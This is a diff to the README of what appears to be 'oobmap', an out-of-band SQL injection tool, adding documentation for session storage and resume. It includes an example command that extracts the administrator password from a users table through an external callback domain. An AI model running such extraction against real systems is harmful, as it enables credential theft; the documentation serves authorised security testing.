@@ -252,6 +252,40 @@ For HTTPS targets saved as raw HTTP requests, add:
 --force-ssl
 ```
 
+## Sessions and Resume
+
+`oobmap` keeps a per-target session by default, similar in spirit to sqlmap.
+Session files are stored under:
+
+```text
+~/.local/share/oobmap/output/<target>/session.sqlite
+```
+
+During extraction, every recovered prefix is saved. If a run is interrupted,
+running the same command again resumes from the next character:
+
+```bash
+oobmap extract -r req.txt -p TrackingId --dbms mssql \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  --expr "SELECT password FROM users WHERE username='administrator'"
+```
+
+Useful options:
+
+```bash
+--output-dir DIR     # store sessions somewhere else
+--flush-session     # delete the current target session before running
+--fresh-queries     # ignore cached extraction values but keep other session data
+```
+
+Examples:
+
+```bash
+oobmap extract ... --output-dir ./oobmap-output
+oobmap extract ... --flush-session
+oobmap extract ... --fresh-queries
+```
+
 ## Payload Profiles
 
 Current profiles:
@@ -348,6 +382,8 @@ Implemented:
 - scalar extraction with `extract`;
 - `dump` helper for one table/column expression;
 - metadata extraction with `enum --banner --current-user --current-db`;
+- automatic resume with `session.sqlite`;
+- `--output-dir`, `--flush-session`, `--fresh-queries`;
 - `--force-ssl`, `--batch`, `--risk`, and `--verbose` style options.
 
 Not implemented yet:
@@ -356,7 +392,7 @@ Not implemented yet:
 - WAF bypass/tamper scripts;
 - DBMS fingerprinting;
 - boolean/time/error/UNION exploitation;
-- session resume and persistent run cache.
+- advanced persistent run cache UI.
 
 ## Safety
 
